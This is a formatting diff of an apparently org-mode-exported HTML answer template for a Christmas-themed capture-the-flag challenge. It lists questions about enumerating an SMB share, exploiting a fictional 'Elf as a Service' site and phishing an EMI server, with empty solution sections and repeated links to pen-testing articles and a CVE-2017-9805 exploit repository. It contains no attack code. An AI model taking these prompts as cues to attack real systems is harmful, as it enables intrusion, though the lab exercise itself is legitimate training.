 Santa server, identify and enumerate the SMB file-sharing server.
-What is the file server share name?</li>
+What is the file server share name?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org4a80f83"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-3-1-2" name="sec-6-3-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -2703,42 +2705,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org9c6a7a3"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-3-1-3" name="sec-6-3-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org9692dda"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-3-1-4" name="sec-6-3-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2746,64 +2756,62 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orge1cd9cc"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-3-1-5" name="sec-6-3-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="orgd13d8b1"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-3-1-6" name="sec-6-3-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org2331990"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-3-1-7" name="sec-6-3-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="orgf9d3fda"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-3-1-8" name="sec-6-3-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org3f356a0" class="outline-3">
-<h3 id="org3f356a0">Question 4</h3>
-<div class="outline-text-3" id="text-org3f356a0">
-</div>
-<div id="outline-container-org3e1169e" class="outline-4">
-<h4 id="answer-template"><a id="org3e1169e"></a>Answer Template</h4>
+<div id="outline-container-sec-6-4" class="outline-3">
+<h3 id="sec-6-4">Question 4</h3>
+<div class="outline-text-3" id="text-6-4">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-4-1" name="sec-6-4-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="orga996d92"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-4-1-1" name="sec-6-4-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Elf Web Access (EWA) is the preferred mailer for North Pole elves,
-available internally at <a href="http://mail.northpolechristmastown.com/">http://mail.northpolechristmastown.com/</a>. What
+available internally at <a href="http://mail.northpolechristmastown.com">http://mail.northpolechristmastown.com</a>. What
 can you learn from The Great Book page found in an e-mail on that
-server?</li>
+server?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org21f506d"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-4-1-2" name="sec-6-4-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -2829,42 +2837,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org28f0c63"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-4-1-3" name="sec-6-4-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org798ae6f"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-4-1-4" name="sec-6-4-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2872,64 +2888,62 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org60455c8"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-4-1-5" name="sec-6-4-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org02b0224"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-4-1-6" name="sec-6-4-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org3147805"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-4-1-7" name="sec-6-4-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="orgd6db199"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-4-1-8" name="sec-6-4-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org3bbdc4a" class="outline-3">
-<h3 id="org3bbdc4a">Question 5</h3>
-<div class="outline-text-3" id="text-org3bbdc4a">
-</div>
-<div id="outline-container-orgf0f3bb9" class="outline-4">
-<h4 id="answer-template"><a id="orgf0f3bb9"></a>Answer Template</h4>
+<div id="outline-container-sec-6-5" class="outline-3">
+<h3 id="sec-6-5">Question 5</h3>
+<div class="outline-text-3" id="text-6-5">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-5-1" name="sec-6-5-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org147f91f"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-5-1-1" name="sec-6-5-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>How many infractions are required to be marked as naughty on Santa's
 Naughty and Nice List? What are the names of at least six insider
 threat moles? Who is throwing the snowballs from the top of the North
-Pole Mountain and what is your proof?</li>
+Pole Mountain and what is your proof?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org7a89785"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-5-1-2" name="sec-6-5-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -2955,42 +2969,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orga06edf8"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-5-1-3" name="sec-6-5-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org5ba07b6"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-5-1-4" name="sec-6-5-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2998,67 +3020,65 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orgf6bd0be"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-5-1-5" name="sec-6-5-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org489e250"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-5-1-6" name="sec-6-5-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="orga042a4d"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-5-1-7" name="sec-6-5-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org4d6fe0c"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-5-1-8" name="sec-6-5-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org0c39089" class="outline-3">
-<h3 id="org0c39089">Question 6</h3>
-<div class="outline-text-3" id="text-org0c39089">
-</div>
-<div id="outline-container-org957eb0a" class="outline-4">
-<h4 id="answer-template"><a id="org957eb0a"></a>Answer Template</h4>
+<div id="outline-container-sec-6-6" class="outline-3">
+<h3 id="sec-6-6">Question 6</h3>
+<div class="outline-text-3" id="text-6-6">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-6-1" name="sec-6-6-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="orgb462030"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-6-1-1" name="sec-6-6-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>The North Pole engineering team has introduced an Elf as a Service
 (EaaS) platform to optimize resource allocation for mission-critical
 Christmas engineering projects at
-<a href="http://eaas.northpolechristmastown.com/">http://eaas.northpolechristmastown.com/</a>. Visit the system and retrieve
+<a href="http://eaas.northpolechristmastown.com">http://eaas.northpolechristmastown.com</a>. Visit the system and retrieve
 instructions for accessing The Great Book page from C:\greatbook.txt.
 Then retrieve The Great Book PDF file by following those directions.
-What is the title of The Great Book page?</li>
+What is the title of The Great Book page?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org9433139"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-6-1-2" name="sec-6-6-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -3084,42 +3104,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org2b9ea32"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-6-1-3" name="sec-6-6-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="orgf60d7c9"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-6-1-4" name="sec-6-6-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -3127,53 +3155,50 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org9d71ae1"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-6-1-5" name="sec-6-6-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org99bfc6e"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-6-1-6" name="sec-6-6-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org09619cd"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-6-1-7" name="sec-6-6-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="orgc5a8fa3"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-6-1-8" name="sec-6-6-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-orgb4b3f6f" class="outline-3">
-<h3 id="orgb4b3f6f">Question 7</h3>
-<div class="outline-text-3" id="text-orgb4b3f6f">
-</div>
-<div id="outline-container-org8dfa840" class="outline-4">
-<h4 id="answer-template"><a id="org8dfa840"></a>Answer Template</h4>
+<div id="outline-container-sec-6-7" class="outline-3">
+<h3 id="sec-6-7">Question 7</h3>
+<div class="outline-text-3" id="text-6-7">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-7-1" name="sec-6-7-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org34ff6c4"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-7-1-1" name="sec-6-7-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Like any other complex SCADA systems, the North Pole uses Elf-Machine
 Interfaces (EMI) to monitor and control critical infrastructure
@@ -3181,13 +3206,14 @@ assets. These systems serve many uses, including email access and web
 browsing. Gain access to the EMI server through the use of a phishing
 attack with your access to the EWA server. Retrieve The Great Book
 page from C:\GreatBookPage7.pdf. What does The Great Book page
-describe?</li>
+describe?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orgb192070"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-7-1-2" name="sec-6-7-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -3213,42 +3239,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
